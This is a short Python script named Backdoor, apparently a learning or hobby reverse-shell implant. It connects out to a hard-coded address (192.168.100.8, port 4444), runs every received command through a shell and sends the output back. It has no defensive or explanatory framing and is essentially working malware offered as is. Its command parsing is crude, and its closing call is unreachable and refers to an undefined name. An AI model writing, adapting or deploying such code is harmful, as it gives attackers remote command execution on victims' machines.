import socket
import subprocess


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.connection.recv(1024)
            c = str(command)
            a = c.replace(c[0], "")
            s = a.replace(a[0], "")
            # print(s)
            command_result = self.execute_system_command(str(s))
            self.connection.send(command_result)

        connection.close()


my_backdoor = Backdoor("192.168.100.8", 4444)
my_backdoor.run()
